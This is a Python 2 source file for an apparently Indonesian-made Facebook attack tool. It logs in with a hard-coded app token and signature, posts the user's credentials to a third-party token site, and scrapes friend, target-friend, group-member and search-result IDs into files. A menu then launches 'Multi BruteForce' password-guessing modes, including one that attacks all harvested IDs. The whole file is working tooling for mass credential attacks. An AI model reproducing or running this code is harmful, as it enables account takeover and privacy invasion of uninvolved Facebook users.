import threading
import mechanize
import bs4,re,sys,time,json
import os
from data import language
import requests
from data.color import *
from data import cache
import subprocess as kontolatos

cache.cleanCache()

if (os.path.exists("out")):
	pass
else:
	os.mkdir("out")

def tol():
	if os.path.exists("out/search.txt"):
		if os.path.getsize("out/search.txt") !=0:
			print "[%s*%s] File Exists: out/search.txt"%(R,N)
			o=raw_input("[%s?%s] Append id? y/n?): "%(R,N))
			if o.lower() !="y":
				print "%s[*]%s output: out/search.txt"%(G,N)
				open("out/search.txt","w").close()
			else:
				print "%s[*]%s output: out/search.txt"%(G,N)
		else:
			open("out/search.txt","w").close()
	else:
		print "%s[*]%s output: out/search.txt"%(G,N)
		open("out/search.txt","w").close()
		
def ok():
	if os.path.exists("out"):
		open("out/myfriends.txt","w").close()
	else:
		os.mkdir("out")
		open("out/myfriends.txt","w").close()
		
def tod():
	if os.path.exists("out"):
		if os.path.exists("out/jumping"):
			pass
		else:
			os.mkdir("out/jumping")
	else:
		os.mkdir("out")
		
def ngntd():
	if os.path.exists("out"):
		if os.path.exists("out/group.txt"):
			if os.path.getsize("out/group.txt") !=0:
				o=raw_input("%s[!]%s path exists: out/group.txt\n%s[?]%s replace? y/n): "%(R,N,R,N)).lower()
				if o == "y":
					open("out/group.txt","w").close()
		else:
			open("out/group.txt","w").close()
	else:
		os.mkdir("out")
		open("out/group.txt","w").close()
		
		
class jamping:
	def __init__(self):
		tod()
		self.token=""
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.k="https://graph.facebook.com/{}"
		self.req=requests.Session()
		self.login()
	
	def login(self):
		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(self.config["email"],self.config["pass"])).json()
		try:
			self.r["access_token"]
			print("[%s*%s] Login Success.."%(G,N))
			print("[%s*%s] Dumping  id ..."%(G,N))
		except Exception as e:
			sys.exit("%s[!]%s Login Failed."%(R,N))
		self.dumps()
		
	def dumps(self):
		ids=[]
		for x in requests.get(self.k.format(
			"me/friends?access_token=%s"%(
				self.r["access_token"]))).json()["data"]:
			ids.append(x["id"])
		print("%s[*]%s total friends: %s"%(G,N,len(ids)))
		self.tanya(ids)
		
	def tanya(self,ids):
		try:
			self.s=input("%s[*]%s how many friends you want to jump? "%(G,N))
			if self.s > len(ids):
				print("%s[!]%s to many number!"%(R,N))
				return self.tanya(ids)
		except Exception as e:
			print("%s[!]%s %s"%(e))
			return self.tanya(ids)
		print "%s[*]%s PRESS CTRL+C TO NEXT"%(G,N)#
		fixid=[]
		for x in ids:
			fixid.append(x)
			if len(fixid) ==self.s:
				break
		self.lgin(fixid)
		
	
	def lgin(self,fixid):
		s=self.req.post(self.i.format("login"),
			data=
				{
					"email":self.config["email"],
					"pass":self.config["pass"]
				}
		).url
		if "save-device" in s or "m_sess" in s:
			for x in fixid:
				try:
					self.data(x)
				except:
					print "\n"+"-"*50
					continue
		else:exit("%s[!]%s failed when login."%(R,N))
			
	def data(self,x):
		datas=[]
		bs=bs4.BeautifulSoup(
			self.req.get(self.i.format(x),timeout=10).text,
		features="html.parser")
		self.names=bs.find("title").renderContents()
		open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt","w").close()
		for x in bs.find_all("a",href=True):
			if "/friends?lst=" in x["href"]:
				datas.append(x["href"])
				break
		
		if len(datas) !=0:
			print "\n%s[*]%s dumps from : %s.."%(G,N,self.names[0:30])
			print "%s[*]%s output     : out/jumping/%s.txt"%(G,N,self.names[0:10].replace(" ","_"))
			self.dump(datas[0])
		
	def dump(self,datas):
		bs=bs4.BeautifulSoup(
			self.req.get(self.i.format(datas),timeout=10).text,
		features="html.parser")
		for i in bs.find_all("a",href=True):
			ppp=len(open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt").readlines())
			print("\r%s[*]%s [%s%s%s] writing id ..."%(G,N,R,ppp,N)),;sys.stdout.flush()
			if "fref" in i["href"]:
				a=re.findall("/(.*?)\?fref","%s"%(i["href"]))
				if len(a) !=0:
					open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt","a").write(a[0]+"\n")
			if "profile.php" in i["href"]:
				b=re.findall("php\?id=(.*?)&","%s"%(i["href"]))
				if len(b) !=0:
					open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt","a").write(b[0]+"\n")
			if "/friends?unit_cursor" in i["href"]:
				self.dump(i["href"])
				break
		if os.path.getsize("out/jumping/"+self.names[0:10].replace(" ","_")+".txt") !=0:
			print "\n"+"-"*50
		else:
			print "\n%s[!]%s can't looking friends!"%(R,N)
			os.remove("out/jumping/"+self.names[0:10].replace(" ","_")+".txt")
			print "\n"+"-"*50
			
# Dumpper

def od():
	if (os.path.exists("out")):
		pass
	else:
		os.mkdir("out")
	
class dumpper:
	def __init__(self):
		self.url="https://mbasic.facebook.com/{}"
		self.a="https://graph.facebook.com/{}"
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.login()
	
	def login(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except Exception as f:
			print f
			exit("%s[!]%s login failed/checkpoint."%(R,N))
		self.q()
	
	def q(self):
		self.query=raw_input(
			"%s[?]%s Friends Search Name Query: "%(
				G,N)).lower()
		if self.query =="":
			self.q()
		self.dump()
		
	def dump(self):
		self.target=[]
		print
		for x in requests.get(
			self.a.format("me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			if self.query in x["name"].lower():
				self.target.append(x["id"])
				print("%s. %s"%(len(self.target),
				x["name"].lower().replace(self.query,"%s%s%s"%(
					R,self.query,N))))
		if len(self.target) !=0:
			print 
			self.choice()
		else:
			print("%s[!]%s No result found."%(R,N,))
			self.q()
			
	def choice(self):
		try:
			self.c=input("%s[?]%s Select Number: "%(G,N))
		except Exception as e:
			print("%s[!]%s %s"%(R,N,e))
			print("%s[!]%s Please Input The Number!"%(R,N))
			self.choice()
		self.buka(self.target[self.c-1])
		
	def buka(self,target):
		self.req=requests.Session()
		s=self.req.post(self.url.format("login"),
			data={
				"email":self.config["email"],
				"pass":self.config["pass"]}
		).url
		if "save-device" in s or "m_sess" in s:
			language.lang(self.req,self.url.format("language.php"))
			self.dumps(target)
		else:
			exit("%s[!]%s Login failed/checkpoint."%(R,N))
			
	def dumps(self,target):
		s=bs4.BeautifulSoup(
			self.req.get(self.url.format("%s"%(target))).text,
		features="html.parser")
		for x in s.find_all("a",href=True):
			if "friends?lst" in x["href"]:
				s=bs4.BeautifulSoup(self.req.get(
					self.url.format(x["href"])).text,
				features="html.parser")
				print("%s[+]%s Target: %s"%(G,N,s.find("title").text))
				print("%s[+]%s %s"%(G,N,s.find("h3").text))
				self.file(s)
				break
	
	def file(self,s):
		try:
			self.fs=raw_input("%s[?]%s Filename: "%(G,N))
			if self.fs =="":
				self.file()
			open("out/%s"%(self.fs),"w").close()
		except Exception as F:
			print("%s[!]%s %s"%(R,N,F))
			self.file(s)
		print("%s[*]%s output: out/%s"%(G,N,self.fs))
		self.gr(s)
				
	def gr(self,url):
		for x in url.find_all("a",href=True):
			if "fref" in x["href"]:
				f=str(x["href"])
				if "profile.php" in f:
					a=re.findall("\/profile\.php\?id=(.*?)&",f)
					if len(a) !=0:
						open("out/%s"%(self.fs),"a").write(a[0]+"\n")
				else:
					b=re.findall("\/(.*?)\?",f)
					if len(b) !=0:
						open("out/%s"%(self.fs),"a").write(b[0]+"\n")
				h=len(open("out/%s"%(self.fs)).read().splitlines())
				print("\r[%s%s%s] Writting id..."%(
					R,h,N)),;sys.stdout.flush()
						
			if "lihat teman lain" in x.text.lower():
				self.gr(bs4.BeautifulSoup(
					self.req.get(self.url.format(x["href"])).text,
				features="html.parser"))
		exit("\n[+] finished.")
			
					
class me:
	def __init__(self):
		ok()
		self.i="https://graph.facebook.com/{}"
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.q=[]
		self.login()
	def login(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except:
			exit("%s[!]%s login failed."%(R,N))
		for x in requests.get(
			self.i.format("me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			open("out/myfriends.txt","a").write(x["id"]+"\n")
			print("\r[+] %s ID Writted..."%(len(open(
				"out/myfriends.txt").read().splitlines()
			))),;sys.stdout.flush()
		print("\n[*] Output out/myfriends.txt")


class dumps_group(object):
	def __init__(self):
		self.wal=[]
		self.req=requests.Session()
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.api="https://graph.facebook.com/"
		self.mbasic()
		
	def mbasic(self):
		s=self.req.post(self.i.format("login"),
			data=
				{
					"email":self.config["email"],
					"pass":self.config["pass"]
				}
		).url
		if "save-device" in s or "m_sess" in s:
			self.q()
		else:exit("%s[!]%s login failed."%(R,N))
	
	def q(self):
		self.query=raw_input("%s[?]%s Query: "%(
			G,N)).lower()
		if self.query =="":
			self.q()
		self.Dump(self.i.format("groups/?seemore"))
		
	def Dump(self,url):
		s=bs4.BeautifulSoup(self.req.get(url).text,
			features="html.parser")
		print 
		for x in s.find_all("a",href=True):
			if "/groups/" in x["href"]:
				if "category" in x["href"] or "create" in x["href"]:
					continue
				if self.query in x.text.lower():
					f=re.findall("/groups/(.*?)\?",x["href"])
					if len(f) !=0:
						self.wal.append(f[0])
						print("%s. %s"%(len(self.wal),
							x.text.lower().replace(self.query,
						"%s%s%s"%(R,self.query,N))))
						
		if len(self.wal) !=0:
			print 
			self.choice()
		else:
			print("%s[!]%s No Result.\n"%(R,N))
			self.q()
			
	def choice(self):
		try:
			self.num=input("%s[?]%s Select Number: "%(
				G,N))
		except Exception as e:
			print("%s[!]%s %s"%(R,N,e))
			self.choice()
		self.login(self.wal[self.num-1])
		
	def login(self,id):
		s=bs4.BeautifulSoup(requests.post(
			"https://m.autolikeus.me/token.get.php",
		data={
			"username":self.config["email"],
			"password":self.config["pass"]
		}).text,features="html.parser")
		for x in s.find_all("iframe"):
			try:
				self.token=requests.get(
					x["src"]).json()["access_token"]
				
			except:
				print "[!] failed when generate token"
			self.dump(id)
				
	def dump(self,id):
		ngntd()
		bs=bs4.BeautifulSoup(
			self.req.get(self.i.format("groups/"+id)).text,
		features="html.parser")
		title=bs.find("title").text
		print("%s[*]%s Group Name: %s"%(G,N,title))
		print("%s[*]%s Output    : out/group.txt"%(G,N))
		self.dumps(
		"%s%s/members?fields=id&access_token=%s"
			%(self.api,id,self.token))
	
	def dumps(self,id):
		self.j=self.req.get(id).json()
		for x in self.j["data"]:
			z=open("out/group.txt").readlines()
			print("\r[%s%s%s] Writing..."%(R,len(z),N
				)),;sys.stdout.flush()
			open("out/group.txt","a").write(x["id"]+"\n")#
		try:
			self.dumps(self.j["paging"]["next"])
		except:
			print "\n[+] finished."
			

class searchname:
	def __init__(self):
		self.login()
		
	def login(self):
		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("\n[%s*%s] Login Your Facebook ^^\n[%s*%s] Email: "%(C,N,G,N)),raw_input("[%s*%s] Passs: "%(G,N)))).json()
		try:
			self.token=self.r["access_token"]
			print("[%s*%s] Login Success."%(G,N))
			print("[%s*%s] Getting Friends ..."%(G,N))
			self.q()
		except:exit("%s[!]%s login failed."%(R,N))
		
	def q(self):
		self.query=raw_input("[%s*%s] Query: "%(G,N))
		if self.query == "":
			return self.q()
		self.lot()
	def lot(self):
		found=[]
		k=requests.get("https://graph.facebook.com/me/friends?access_token=%s"%(self.token)).json()
		for x in k["data"]:
			if self.query in x["name"].lower():
				found.append(x["id"])
				print("%s[%s] %s %s"%(G,len(found),N,x["name"]))
		
		if len(found) !=0:
			print("\n[%sFound%s]: %s"%(G,N,len(found)))
			r=raw_input("[%s?%s] Write? y/n: "%(R,N))
			if r.lower() !="y":
				return self.query()
			else:
				n=raw_input("[%s?%s] File name: "%(R,N))
				for x in found:
					open("out/"+n,"a+").write(x+"\n")
				print("[%s*%s] Output: out/%s"%(G,N,n))
				
class search_people(object):
	def __init__(self):
		self.req=requests.Session()
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.login()
		
	def login(self):
		s=self.req.post(self.i.format("login"),
			data=
				{
					"email":self.config["email"],
					"pass":self.config["pass"]
				}
		).url
		if "save-device" in s or "m_sess" in s:
			self.q()
		else:
			exit("%s[!]%s login failed."%(R,N))
			
	def q(self):
		self.query=raw_input("%s[?]%s Query: "%(G,N))
		if self.query =="":
			self.q()
		else:
			tol()
			loli=[]
			bs=bs4.BeautifulSoup(
				self.req.get(
					self.i.format("search/top/?q=%s"%(
			self.query))).text,features="html.parser")
			for x in bs.find_all("a",href=True):
				if "graphsearch" in x["href"]:
					loli.append(self.i.format(x["href"]))
			if len(loli) !=0:
				self.cari(loli[0])
			else:
				print("[!] no result found.")
				
	def cari(self,url):
		bs=bs4.BeautifulSoup(self.req.get(url).text,
			features="html.parser")
		for x in bs.find_all("a",href=True):
			p=x.find("div")
			if "None" in str(p) or "+" in str(p):
				continue
			else:
				js=re.findall("/(.*?)$",x["href"])
				if len(js) !=0:
					print "\r%s[*]%s %s                          "%(G,N,p.text)
					open("out/search.txt","a").write(
						"%s\n"%(
							js[0].replace("profile.php?id=","")))
					print "\r[%s%s%s] Writing .. "%(
							R,len(open("out/search.txt").readlines()),
					N),;sys.stdout.flush()
		for xi in bs.find_all("a",href=True):
			if "lihat hasil selanjutnya" in xi.text.lower():
				self.cari(xi["href"])
		exit("\n[+] finished.")
				

class pilihan():
	def __init__(self):
		print "\n\t[ Select Actions ]\n"
		print "{%s01%s} Dump ID from your friends"%(G,N)
		print "{%s02%s} Robber ID from targets friend"%(G,N)
		print "{%s03%s} JUMPING"%(G,N)
		print "{%s04%s} Dump ID From GROUP"%(G,N)
		print "{%s05%s} Dump ID by explore search name query"%(G,N)
		print "{%s06%s} Start Multi BruteForce"%(G,N)
		print "{%s07%s} Start MultiBruteForce v.2"%(G,N)
		print "{%s08%s} Start MultiBruteForce v.3 (Auto BruteForce ALL ID)\n"%(G,N)
		f=raw_input("%s[%s+%s]%s Actions>> "%(G,R,G,N))
		if f == "1" or f == "01":
			self.a()
		elif f == "2" or f == "02":
			self.b()
		elif f == "3" or f == "03":
			self.c()
		elif f == "4" or f == "04":
			self.newmodule()
		elif f == "5" or f == "05":
			self.serpipel()
		elif f == "6" or f == "06":
			self.d()
		elif f == "7" or f == "07":
			from data import multiBruteforce
			multiBruteforce.prepare()
		elif f =="8" or f =="08":
			from data import multiBruteforce
			multiBruteforce.autoburut()
		else:sys.exit("%s[!]%s Invalid options!"%(R,N))
		
	def serpipel(self):
		search_people()
		
	def a(self):
		me()
		
	def b(self):
		dumpper()
	
	def c(self):
		jamping()
		
	def d(self):
		from data import multiBruteforce
		multiBruteforce._prepares()
		
	def newmodule(self):
		print("\n\t [ Select Actions ]\n")
		print("{%s01%s} Dump id from group\n"%(G,N))
		c=raw_input("%s[%s+%s]%s Actions>> "%(G,R,G,N))
		if (c == "1" or c == "01"):
			dumps_group()
		else:exit("%s[!]%s invalid option"%(R,N))
